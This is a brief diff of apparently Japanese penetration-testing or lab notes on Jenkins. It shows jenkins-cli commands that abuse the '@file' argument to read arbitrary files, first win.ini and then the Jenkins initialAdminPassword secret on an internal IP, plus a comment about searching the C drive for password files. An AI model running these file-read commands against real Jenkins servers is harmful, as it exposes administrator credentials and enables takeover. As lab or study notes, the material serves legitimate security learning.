@@ -635,7 +635,7 @@ jenkinsのconfigに直接はアクセスできないか
 `# Cドライブ全体から "password" という文字列を含むファイルを再帰的に検索
 
 
-`\\172.16.104.202\C$\Users\xxx`
+
 
 `java -jar jenkins-cli.jar -s http://<targetIP>:8080/ -http help "@C:\Windows\win.ini"`
 ⇨もしアクセスできたら、`java -jar jenkins-cli.jar -s http://172.16.104.202:8080/ -http help "@C:\Windows\System32\config\systemprofile\AppData\Local\Jenkins\.jenkins\secrets\initialAdminPassword"`
